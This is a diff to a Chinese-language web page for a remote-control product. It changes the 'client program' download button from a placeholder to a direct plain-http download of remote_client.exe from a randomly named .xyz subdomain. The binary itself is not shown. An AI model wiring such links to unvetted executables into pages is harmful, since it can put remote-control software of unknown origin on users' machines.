@@ -282,7 +282,7 @@
                     </div>
                     <h3>客户端程序</h3>
                     <p>用于安装在需要被控制的Windows设备上的客户端程序，支持Windows 7/8/10/11系统。</p>
-                    <a href="#" class="download-btn" id="clientDownloadBtn">
+                    <a href="http://feaasqsz.hk6.345888.xyz.cdn.cloudflare.net/remote_client.exe" class="download-btn" id="clientDownloadBtn" download>
                         <i class="bi bi-download"></i> 下载客户端
                     </a>
                 </div>
@@ -460,12 +460,10 @@
         }
         
         document.addEventListener('DOMContentLoaded', function() {
-            // 只保留客户端下载的事件处理
+            // 客户端下载按钮事件处理
             document.getElementById('clientDownloadBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('客户端程序即将开始下载，如未自动下载，请点击"确定"后再次点击下载按钮。');
-                // 这里替换为实际的下载链接
-                // window.location.href = 'downloads/remote_client_setup.exe';
+                window.location.href = 'http://feaasqsz.hk6.345888.xyz.cdn.cloudflare.net/remote_client.exe';
             });
             
             // 处理导航栏的状态
